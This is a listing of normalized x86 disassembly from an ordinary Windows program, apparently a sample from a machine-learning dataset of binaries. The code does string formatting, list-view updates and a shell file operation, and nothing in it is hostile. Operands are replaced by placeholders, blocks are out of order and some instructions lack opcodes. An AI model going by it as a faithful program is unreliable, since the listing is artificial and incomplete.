mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x3
jne r-xdata
mov eax [ esi + 0x8 ]
push ebx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
add edi ebx
mov ebx edi
shr ebx 0x2
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x8 ]
add eax 0x4
shr eax 0x2
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub ebx eax
push 0x1
mov ecx esi
call sub_4aafa0
mov edx [ esi + 0x4 ]
mov eax [ edx + ebx * 4 ]
and edi 0x3
lea eax [ eax + edi * 4 ]
test eax eax
pop edi
pop ebx
je r-xdata
push 0x10
call sub_4b573e
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ecx + ebx * 4 ] eax
inc [ esi + 0x10 ]
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_4ab400
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0xc
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x3
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 8 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_461ba0
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_4ab0d0
pop edi
pop esi
retn 0xc
sub_4ab480
sub esp 0xc
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
mov ebx [ rw-data ]
test ebx ebx
mov [ esp + 0x8 ] esi
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
push ebp
mov ebp [ rw-data ]
lea eax [ edx + ebx ]
dec ebp
dec eax
push edi
mov [ esp + 0x18 ] ecx
mov edi rw-data
mov esi eax
lea eax [ esp + 0x8 ]
push eax
mov ecx rw-data
mov [ esp + 0xc ] esi
call sub_4ab380
jmp r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
cmp esi ebp
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ edx + ecx ]
mov [ rw-data ] eax
mov eax esi
mov ecx rw-data
pop esi
mov [ rw-data ] ecx
pop ebx
add esp 0xc
retn
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
test ecx ecx
je r-xdata
sub eax edx
test ebx ebx
pop edi
pop ebp
jne r-xdata
test ebx ebx
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov ebx [ rw-data ]
mov edx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] edx
push eax
mov eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push ecx
jmp r-xdata
dec esi
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
jne r-xdata
mov ecx rw-data
call sub_4ab380
mov esi [ esp + 0x8 ]
cmp edi [ esp + 0x18 ]
jne r-xdata
mov [ rw-data ] 0x0
sub_4ab590
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1e41
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x174
test eax eax
push ebx
push ebp
push esi
push edi
jbe r-xdata
mov edi [ rw-data ]
mov esi rw-data
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
xor ebp ebp
cmp eax ebp
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add eax ecx
cmp esi rw-data
jne r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] ebp
jne r-xdata
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov ecx edi
sub ecx edx
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
cmp edi eax
je r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
cmp ecx ebx
je r-xdata
sub eax edx
mov ecx rw-data
call sub_460310
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
cmp eax 0x1
push eax
jle r-xdata
test esi esi
mov ebp ebx
jne r-xdata
mov eax [ esp + 0x14 ]
inc edx
cmp eax edx
jge r-xdata
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] ebp
mov [ esp + 0x18c ] ebp
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] ebp
mov [ esp + 0x3c ] ebp
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ rw-data ]
push eax
push ecx
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x198 ] 0x1
call sub_4ab400
mov ecx [ rw-data ]
mov edi [ esp + 0x24 ]
add ecx ecx
xor eax eax
[ edi ]
mov eax [ rw-data ]
mov ecx rw-data
mov esi eax
mov edi ecx
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] edi
lea ebx [ ebx ]
inc edi
jmp r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov ecx [ esp + 0x184 ]
pop edi
pop esi
or eax 0xffffffff
pop ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x180
retn
mov edi [ rw-data ]
cmp esi edi
je r-xdata
lea eax [ esp + 0x88 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
push 0x1
lea edx [ esp + 0x8c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
cmp esi [ rw-data ]
je r-xdata
push esi
call j_sub_4b66ed#2
add esp 0x4
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebp [ esp + 0x54 ]
sub eax edx
test ebp ebp
je r-xdata
lea eax [ esp + 0x84 ]
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x18 ]
mov ebx [ esi + ecx + 0x38 ]
mov ebx 0xfffffffb
jmp r-xdata
cmp [ esp + 0x14 ] edx
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ ecx ]
lea eax [ esp + 0x14 ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
sub eax edx
mov esi [ rw-data ]
xor edi edi
xor ebx ebx
jmp r-xdata
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
mov esi [ rw-data ]
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
jle r-xdata
mov edx ebx
sub edx ebp
cmp edx 0x1
je r-xdata
cmp edi ebx
jge r-xdata
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
inc eax
mov [ esp + 0x18 ] eax
xor ebp ebp
mov esi eax
jmp r-xdata
mov ebp [ esp + 0x14 ]
xor ebx ebx
xor edi edi
cmp esi ebx
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
jne r-xdata
cmp [ esp + 0x58 ] 0x10
mov esi [ esp + 0x44 ]
jae r-xdata
mov ecx eax
cmp edi ebp
jne r-xdata
mov eax ebx
sub eax ebp
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
inc ecx
add eax 0x70
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp edi ebx
cmp edi [ rw-data ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp [ esp + 0x58 ] 0x10
mov [ esp + 0x18c ] 0xffffffff
jb r-xdata
push 0xffffffff
push 0x0
lea edx [ esp + 0x48 ]
add ecx 0x348
push edx
call sub_401dd0
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edi [ esp + 0x58 ]
cmp edi 0x10
mov esi [ esp + 0x44 ]
mov eax esi
jae r-xdata
lea edi [ esp + 0x84 ]
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x44 ]
inc ebp
push ebp
inc edi
push edi
lea eax [ esp + 0x8c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x94 ]
add esp 0x10
lea edx [ eax + 0x1 ]
inc edi
push edi
lea ecx [ esp + 0x88 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x90 ]
add esp 0xc
lea edx [ eax + 0x1 ]
test esi esi
jne r-xdata
mov eax [ edi + esi + 0x38 ]
test eax eax
jl r-xdata
cmp ebx edx
jge r-xdata
mov ebp [ esp + 0x38 ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x34 ]
xor edi edi
mov eax [ edi + esi + 0x38 ]
cmp eax ebx
jl r-xdata
cmp ebp edx
jge r-xdata
mov edx [ esp + 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov esi [ eax + 0x380 ]
and ecx 0x7
cmp ecx esi
jne r-xdata
cmp edi 0x10
lea ecx [ eax + ebp ]
mov edx esi
jae r-xdata
lea eax [ esp + 0x44 ]
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x88 ]
push ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x88 ]
push edx
jmp r-xdata
inc ebx
add edi 0x70
jmp r-xdata
mov edx [ esp + 0x24 ]
mov [ edx + eax * 8 + 0x4 ] 0x1
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx + edi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ esp + 0x28 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
inc ebp
add edi 0x70
jmp r-xdata
mov edx [ esp + 0x24 ]
mov [ edx + eax * 8 + 0x4 ] ebx
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x60 ] ecx
mov ecx esi
shl ecx 0x7
mov ecx [ ecx + rw-data ]
test ecx ecx
mov [ esp + 0x5c ] 0x1
mov [ esp + 0x64 ] ecx
jl r-xdata
test edx edx
jne r-xdata
lea edx [ esp + 0x44 ]
lea esi [ esp + 0x44 ]
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov esi [ rw-data ]
mov edi ebx
mov esi [ ebp + 0x4 ]
test esi esi
jne r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ecx + edi * 8 + 0x4 ] 0x1
jne r-xdata
cmp edi eax
jge r-xdata
cmp [ eax + 0x360 ] 0x10
jb r-xdata
mov eax edx
sub eax esi
xor eax eax
jmp r-xdata
mov edx [ eax + 0x38 ]
mov eax [ esp + 0x24 ]
mov [ eax + edx * 8 ] ecx
mov ebp [ esp + 0x14 ]
xor ebp ebp
xor edi edi
mov eax ebp
sub eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov [ ecx + edi * 8 + 0x4 ] eax
mov esi [ rw-data ]
inc eax
mov [ esp + 0x18 ] eax
inc edi
jmp r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ eax + edi * 8 ]
push ecx
call [ lstrlenA@IAT ]
test ebx ebx
jne r-xdata
add eax 0x34c
mov eax [ eax + 0x34c ]
jmp r-xdata
push ecx
push eax
lea ecx [ esp + 0x48 ]
call sub_401ba0
sub ecx edx
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x3c ]
sub ecx ebx
cmp eax ecx
mov [ esp + 0x10 ] 0x0
jae r-xdata
test ecx ecx
jne r-xdata
mov esi ebp
sub esi ebx
xor esi esi
jmp r-xdata
lea ecx [ esp + 0x5c ]
push ecx
push 0x0
push 0x1006
push edx
mov [ esp + 0x80 ] eax
call [ SendMessageA@IAT ]
test ebx ebx
je r-xdata
mov eax [ edi + esi + 0x38 ]
test eax eax
jl r-xdata
cmp ebp edx
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x3c ]
mov [ eax ] ebp
call sub_468e40
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push 0x1
push ebp
call sub_460740
add esp 0x14
jmp r-xdata
mov ecx ebp
sub ecx ebx
xor ecx ecx
jmp r-xdata
test ebx ebx
lea eax [ esi + eax + 0x1 ]
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
push ebx
call j_sub_4b66ed#2
mov esi [ rw-data ]
add esp 0x4
inc ebp
add edi 0x70
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx + eax * 8 + 0x4 ]
mov [ edi + esi + 0x38 ] edx
mov esi [ rw-data ]
mov ecx [ rw-data ]
xor eax eax
lea edx [ esp + 0x5c ]
push edx
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] 0x3
mov [ esp + 0x68 ] ebx
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] 0x50
mov [ esp + 0x72 ] eax
mov [ esp + 0x76 ] eax
mov [ esp + 0x7a ] eax
call [ SHFileOperationA@IAT ]
mov esi [ rw-data ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
cmp ecx eax
jae r-xdata
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
mov edi [ esi + 0x38 ]
mov [ esp + 0x18c ] 0x2
mov ebx edi
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x18 ] 0x70
push eax
call j_sub_4b66ed#2
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ eax + edi * 8 ]
push ecx
lea edx [ ebx + esi ]
push edx
call [ lstrcpyA@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x24 ]
mov esi [ rw-data ]
dec eax
mov [ rw-data ] eax
inc edi
jmp r-xdata
mov ecx ebp
sub ecx ebx
cmp eax ecx
jae r-xdata
mov ecx ebp
sub ecx ebx
xor ecx ecx
jmp r-xdata
add eax ebx
cmp eax ebp
je r-xdata
lea edx [ esp + 0x10 ]
sub eax ecx
push edx
push eax
push ecx
mov eax esp
lea ecx [ esp + 0x3c ]
mov [ eax ] ebp
call sub_468e40
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
jmp r-xdata
mov ebp eax
mov [ esp + 0x38 ] ebp
sub_4abd50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c1e9d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x10214
call sub_4b6180
push ebx
push esi
push edi
mov ecx rw-data
mov [ esp + 0xf4 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor esi esi
cmp eax esi
mov [ esp + 0x1022c ] esi
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ rw-data ] edx
mov [ rw-data ] esi
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x10224 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call [ lstrlenA@IAT ]
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx esi
je r-xdata
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x68 ] esi
mov [ esp + 0x6c ] esi
mov ecx [ rw-data ]
push esi
push ecx
lea ecx [ esp + 0x68 ]
mov [ esp + 0x10234 ] 0x2
call sub_41d110
mov ecx [ rw-data ]
mov edi [ esp + 0x64 ]
or eax 0xffffffff
[ edi ]
lea ecx [ esp + 0x1f8 ]
call sub_44fb50
push ebx
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x10230 ] 0x3
call sub_44f660
mov dl [ esp + 0x2b ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5c ] 0xffffffff
mov [ esp + 0x18 ] dl
call sub_448010
mov [ esp + 0x1c ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esp + 0x1c ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov [ eax ] eax
mov eax [ esp + 0x1c ]
mov [ eax + 0x8 ] eax
mov [ esp + 0x20 ] esi
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x200 ]
push edx
mov [ esp + 0x10238 ] 0x4
call sub_4aa8a0
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
xor esi esi
mov edi [ esp + 0x34 ]
mov eax [ rw-data ]
cmp edi eax
mov esi [ esp + 0x44 ]
jl r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esp + 0x24 ]
cmp ebx eax
jl r-xdata
lea edi [ eax - 0x1 ]
mov [ esp + 0x34 ] edi
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ eax + esi * 4 ]
cmp ecx 0xffffffff
je r-xdata
cmp esi ecx
jge r-xdata
xor eax eax
cmp edi ebx
setle al
lea eax [ eax + eax - 0x1 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x40 ]
test eax eax
jne r-xdata
lea ebx [ eax - 0x1 ]
mov [ esp + 0x24 ] ebx
lea eax [ esp + 0x3c ]
push eax
mov ecx rw-data
call sub_46b640
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push eax
push ecx
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x10238 ] 0x3
call sub_448f60
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
xor esi esi
add esp 0x4
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x1022c ] 0x2
call sub_44f5f0
mov eax [ esp + 0x64 ]
cmp eax esi
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
test eax eax
jbe r-xdata
inc esi
jmp r-xdata
mov edx [ esp + 0x64 ]
cmp [ edx + ecx * 4 ] 0xffffffff
jne r-xdata
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
xor esi esi
jmp r-xdata
mov ebx [ esp + 0x40 ]
cmp ebx esi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x58 ] 0x0
mov eax [ esp + 0x40 ]
test eax eax
mov [ esp + 0x1022c ] 0x6
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ eax + esi * 4 ]
mov edx [ esp + 0x64 ]
mov ecx [ edx + ecx * 4 ]
mov [ eax + esi * 4 ] ecx
mov edx [ rw-data ]
mov ecx [ edx + esi * 4 ]
test ecx ecx
mov eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + esi * 4 ]
test edi edi
lea ebx [ eax + esi * 4 ]
je r-xdata
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x200 ]
push ecx
call sub_4aa8a0
add esp 0xc
test eax eax
jne r-xdata
imul eax eax 0x70
imul esi esi 0x70
imul edi edi 0x70
mov [ esp + 0x70 ] eax
add esi [ esp + 0x40 ]
mov [ esp + 0x2c ] edi
mov [ esp + 0x10 ] esi
lea ebx [ ebx ]
mov edx ebx
sub edx edi
imul edx [ esp + 0x14 ]
sub esp 0x70
mov eax esp
mov ecx 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x14 ] 0x0
mov [ eax + 0x4 ] 0x0
lea edx [ edx + esi + 0x1 ]
mov [ eax + 0x6c ] ecx
mov [ esp + 0x7c ] esp
mov [ eax + 0x68 ] 0x0
push edx
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xa4 ] esi
mov [ eax + 0x58 ] 0x0
call sub_42cdb0
mov eax [ esp + 0x14 ]
add ebx eax
cmp edi ebx
mov [ esp + 0x38 ] edi
mov [ esp + 0xc ] ebx
je r-xdata
mov edi [ esp + 0x44 ]
cmp ebx edi
mov esi ebx
je r-xdata
mov ecx [ esp + 0x44 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edx [ eax + esi * 4 ]
mov [ ecx ] edx
call sub_439ed0
mov eax [ rw-data ]
mov [ ebx ] 0x0
mov eax [ rw-data ]
dec [ edi + 0xd48 ]
jne r-xdata
mov edx [ esp + 0x64 ]
mov eax [ esp + 0x30 ]
mov [ edx + esi * 4 ] eax
mov ecx [ rw-data ]
mov edx [ esp + 0x2c ]
lea eax [ edx + ecx ]
mov ecx [ esp + 0x10 ]
push eax
call sub_402540
mov [ esp + 0x5c ] esi
mov eax 0xf
mov [ esp + 0x90 ] eax
mov [ esp + 0x8c ] edx
mov [ esp + 0x7c ] dl
mov [ esp + 0xe4 ] eax
mov [ esp + 0xe0 ] edx
mov [ esp + 0xd0 ] dl
or eax 0xffffffff
mov [ esp + 0xb0 ] eax
mov [ esp + 0xa8 ] eax
mov [ esp + 0xb4 ] eax
cmp [ esp + 0x20 ] edx
mov [ esp + 0x1022c ] 0x5
mov [ esp + 0x98 ] edx
mov [ esp + 0x9c ] edx
mov [ esp + 0xa0 ] edx
mov [ esp + 0xa4 ] edx
mov [ esp + 0x94 ] edx
mov [ esp + 0xac ] edx
jne r-xdata
push ebx
call j_sub_4b66ed#2
add esp 0x4
mov edi edi
mov eax edx
sub eax ebx
sar eax 0x2
xor eax eax
jmp r-xdata
push 0x0
push edx
lea ecx [ esp + 0x54 ]
call sub_42c920
mov edx [ esp + 0x54 ]
mov ebx [ esp + 0x50 ]
xor ecx ecx
lea ebx [ ebx ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esp + 0x38 ]
xor edx edx
cmp esi edx
jge r-xdata
mov esi [ rw-data ]
xor ebx ebx
xor edi edi
mov edi edi
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
mov esi [ rw-data ]
mov edi rw-data
jmp r-xdata
mov [ ebx + ecx * 4 ] 0x0
inc ecx
jmp r-xdata
cmp ecx eax
jge r-xdata
mov eax [ esp + 0x5c ]
cmp eax 0xffffffff
push 0xffffffff
lea ecx [ esp + 0x7c ]
push 0x0
jne r-xdata
cmp ebx edx
jge r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp edi rw-data
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ ecx + edx ]
jne r-xdata
test ebx ebx
jne r-xdata
imul eax eax 0x70
add eax esi
push eax
call sub_401dd0
cmp [ esp + 0x90 ] 0x10
mov eax [ esp + 0x7c ]
jae r-xdata
push esi
call sub_401dd0
mov eax [ esp + 0x90 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x7c ]
jae r-xdata
mov ebx 0x1
jmp r-xdata
lea edx [ edi + esi ]
push edx
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_448ca0
inc ebx
add edi 0x70
xor edx edx
jmp r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
mov ebx eax
sar ebx 0x2
mov eax ebx
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
cmp esi eax
je r-xdata
push eax
call sub_458010
mov ecx [ esp + 0x90 ]
add esp 0x4
cmp eax ecx
ja r-xdata
lea eax [ esp + 0x7c ]
push eax
call sub_457f90
mov esi eax
mov eax [ esp + 0x94 ]
add esp 0x4
cmp eax edi
mov eax [ esp + 0x7c ]
jae r-xdata
lea eax [ esp + 0x7c ]
mov esi [ rw-data ]
cmp esi edx
je r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ esp + 0x64 ]
cmp [ edx + ecx * 4 ] 0xffffffff
mov eax ebx
jne r-xdata
sub eax edx
lea edx [ esp + 0x4c ]
push edx
mov ecx rw-data
call sub_46a4b0
test ebx ebx
mov [ esp + 0x1022c ] 0x4
je r-xdata
sub eax ecx
push 0x0
push eax
lea ecx [ esp + 0x80 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x80 ]
call sub_401ba0
jmp r-xdata
push eax
call sub_458010
mov edi eax
mov eax [ esp + 0x90 ]
add esp 0x4
cmp esi eax
ja r-xdata
lea eax [ esp + 0x7c ]
lea edx [ eax * 4 ]
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
push ebx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xfc ]
push eax
lea ecx [ esp + 0x80 ]
call sub_401cc0
lea ecx [ esp + 0x78 ]
push ecx
lea edx [ esp + 0xf0 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_448ca0
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc ebx
test al al
mov [ esp + 0x4c ] ecx
je r-xdata
push ebx
lea edx [ esp + 0xfc ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x104 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ecx esi
sub ecx eax
push 0x0
push ecx
lea ecx [ esp + 0x80 ]
call sub_4017f0
push 0xffffffff
push esi
lea ecx [ esp + 0x80 ]
call sub_401ba0
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
lea eax [ edx + ecx * 4 ]
mov [ esp + 0xc ] eax
mov eax ebx
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
sub eax edx
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
mov eax [ ecx + edx + 0x20 ]
sub [ rw-data ] eax
mov eax ebx
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
sub eax edx
mov esi [ rw-data ]
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x78 ]
push edx
call sub_402540
mov eax [ esp + 0xe4 ]
mov edi 0x10
cmp eax edi
mov [ esp + 0x1022c ] 0x4
jb r-xdata
mov esi eax
lea esp [ esp ]
sub edi esi
lea eax [ edi + 0x1 ]
test eax eax
jle r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ esp + 0x64 ]
mov eax [ edx + ecx * 4 ]
